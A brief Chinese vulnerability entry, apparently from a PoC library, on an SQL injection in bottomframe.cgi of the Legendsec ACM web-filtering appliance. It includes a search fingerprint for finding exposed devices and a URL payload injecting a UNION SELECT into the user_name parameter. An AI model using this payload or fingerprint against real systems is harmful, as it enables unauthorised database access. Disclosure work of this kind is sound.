# 网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞

## 漏洞描述

网御 ACM上网行为管理系统 bottomframe.cgi 存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感信

## 漏洞影响

<a-checkbox checked>网御 ACM上网行为管理系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"scripts/webcommon.js"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1663994453807-0fa60804-9c2a-41bc-92b4-778b8f02afd0.png)

验证POC

```sql
/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
```

![img](../../../.vuepress/public/img/1663994495576-74ca5671-1b50-4cd9-b894-0de7277e073b.png)